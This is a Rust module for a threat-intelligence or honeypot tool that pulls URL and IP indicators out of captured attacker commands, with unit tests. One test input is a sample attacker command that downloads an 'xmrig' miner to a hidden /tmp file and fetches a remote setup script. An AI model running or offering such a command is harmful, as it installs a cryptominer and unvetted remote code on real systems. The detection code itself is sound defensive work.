//! IOC extraction from captured commands and payloads.

use chrono::{DateTime, Utc};
use regex::Regex;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::sync::OnceLock;
use uuid::Uuid;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum IocType {
    IpAddress,
    Domain,
    Url,
    FileHash,
    Username,
    Password,
    Command,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Ioc {
    pub id: Uuid,
    pub ioc_type: IocType,
    pub value: String,
    pub value_hash: String,
    pub first_seen: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub sighting_count: u64,
    pub tags: Vec<String>,
}

impl Ioc {
    pub fn new(ioc_type: IocType, value: impl Into<String>) -> Self {
        let value = value.into();
        let value_hash = hash_value(&value);
        let now = Utc::now();

        Self {
            id: Uuid::new_v4(),
            ioc_type,
            value,
            value_hash,
            first_seen: now,
            last_seen: now,
            sighting_count: 1,
            tags: Vec::new(),
        }
    }

    pub fn record_sighting(&mut self) {
        self.last_seen = Utc::now();
        self.sighting_count += 1;
    }
}

fn hash_value(value: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(value.as_bytes());
    hex::encode(hasher.finalize())
}

fn ipv4_pattern() -> &'static Regex {
    static PATTERN: OnceLock<Regex> = OnceLock::new();
    PATTERN.get_or_init(|| {
        Regex::new(
            r"\b(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\b",
        )
        .expect("ipv4 pattern")
    })
}

fn url_pattern() -> &'static Regex {
    static PATTERN: OnceLock<Regex> = OnceLock::new();
    PATTERN.get_or_init(|| Regex::new(r#"https?://[^\s'"<>]+"#).expect("url pattern"))
}

/// Pull URL and IP indicators out of a command or other attacker text.
pub fn extract_iocs(text: &str) -> Vec<Ioc> {
    let mut found = Vec::new();
    let mut seen = std::collections::HashSet::new();

    for matched in url_pattern().find_iter(text) {
        let value = matched.as_str().trim_end_matches(|c: char| {
            matches!(c, '.' | ',' | ';' | ')' | ']' | '}' | '\'' | '"')
        });
        if value.len() > 8 && seen.insert(value.to_string()) {
            found.push(Ioc::new(IocType::Url, value));
        }
    }

    for matched in ipv4_pattern().find_iter(text) {
        let value = matched.as_str();
        if value == "0.0.0.0" || seen.contains(value) {
            continue;
        }
        seen.insert(value.to_string());
        found.push(Ioc::new(IocType::IpAddress, value));
    }

    found
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_urls_and_ips_from_a_command() {
        let command =
            "wget http://203.0.113.10/xmrig -O /tmp/.x && curl https://example.com/setup.sh";
        let iocs = extract_iocs(command);
        let urls: Vec<_> = iocs
            .iter()
            .filter(|ioc| ioc.ioc_type == IocType::Url)
            .map(|ioc| ioc.value.as_str())
            .collect();
        let ips: Vec<_> = iocs
            .iter()
            .filter(|ioc| ioc.ioc_type == IocType::IpAddress)
            .map(|ioc| ioc.value.as_str())
            .collect();
        assert!(urls.contains(&"http://203.0.113.10/xmrig"));
        assert!(urls.contains(&"https://example.com/setup.sh"));
        assert!(ips.contains(&"203.0.113.10"));
        assert!(!ips.contains(&"0.0.0.0"));
    }

    #[test]
    fn ignores_text_without_indicators() {
        assert!(extract_iocs("uname -a").is_empty());
    }

    #[test]
    fn strips_trailing_punctuation_from_urls() {
        let iocs = extract_iocs("see http://198.51.100.23/a.sh).");
        assert!(iocs
            .iter()
            .any(|ioc| ioc.value == "http://198.51.100.23/a.sh"));
    }
}
